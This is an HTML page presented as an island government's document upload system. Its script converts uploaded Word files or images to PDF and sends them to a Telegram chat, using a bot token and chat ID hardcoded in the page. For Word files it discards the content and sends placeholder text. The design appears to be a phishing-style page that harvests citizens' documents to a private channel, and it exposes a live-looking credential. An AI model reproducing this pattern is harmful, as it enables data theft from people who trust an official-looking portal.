

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Sistema Documental Insular</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      color: #333;
    }
    header {
      background-color: #003366;
      color: white;
      padding: 10px 20px;
      display: flex;
      align-items: center;
    }
    header img {
      height: 60px;
      margin-right: 20px;
    }
    h1 {
      font-size: 24px;
      margin: 0;
    }
    .container {
      padding: 20px;
    }
    label {
      display: block;
      margin: 15px 0 5px;
    }
    input[type="file"], select {
      padding: 8px;
      width: 100%;
      max-width: 400px;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      background-color: #FFC107;
      border: none;
      font-weight: bold;
      color: #000;
      cursor: pointer;
    }
    button:hover {
      background-color: #e0a800;
    }
    .message {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>

<header>
  <img src="logo_gobierno_insular_web.png" alt="Logo Gobierno del Territorio Insular">
  <h1>Sistema Documental Insular</h1>
</header>

<div class="container">
  <h2>Subir documento (Word o imagen)</h2>
  <form id="uploadForm">
    <label for="file">Seleccionar archivo (.docx, .jpg, .png):</label>
    <input type="file" id="file" accept=".docx,.jpg,.jpeg,.png" required>
    <button type="submit">Convertir y enviar</button>
  </form>

  <div id="msg" class="message"></div>
</div>

<script>
  const botToken = "8085382733:AAEuEHAfeqkiu_teu9TmH8CFF5TiYrKUDyQ";
  const chatId = "-1002773184301";

  document.getElementById("uploadForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const fileInput = document.getElementById("file");
    const file = fileInput.files[0];
    if (!file) return;

    const msg = document.getElementById("msg");
    msg.innerText = "Convirtiendo archivo...";

    const pdfBlob = await convertToPDF(file);
    if (!pdfBlob) {
      msg.innerText = "Error al convertir el archivo.";
      return;
    }

    msg.innerText = "Enviando a Telegram...";
    const formData = new FormData();
    formData.append("document", pdfBlob, "documento.pdf");

    fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
      method: "POST",
      body: formData
    }).then(res => res.json()).then(data => {
      if (data.ok) {
        msg.innerText = "✅ Documento enviado con éxito.";
      } else {
        msg.innerText = "❌ Error al enviar a Telegram.";
        console.error(data);
      }
    });
  });

  async function convertToPDF(file) {
    const { jsPDF } = window.jspdf;

    if (file.type.startsWith("image/")) {
      return new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = function(e) {
          const img = new Image();
          img.onload = function() {
            const pdf = new jsPDF();
            pdf.addImage(img, "JPEG", 15, 15, 180, 160);
            const blob = pdf.output("blob");
            resolve(blob);
          };
          img.src = e.target.result;
        };
        reader.readAsDataURL(file);
      });
    }

    if (file.name.endsWith(".docx")) {
      return new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = function(e) {
          const content = e.target.result;
          const pdf = new jsPDF();
          pdf.text("Contenido de archivo Word no visible directamente. Adjuntado como PDF.", 10, 10);
          const blob = pdf.output("blob");
          resolve(blob);
        };
        reader.readAsArrayBuffer(file);
      });
    }

    return null;
  }
</script>

</body>
</html>
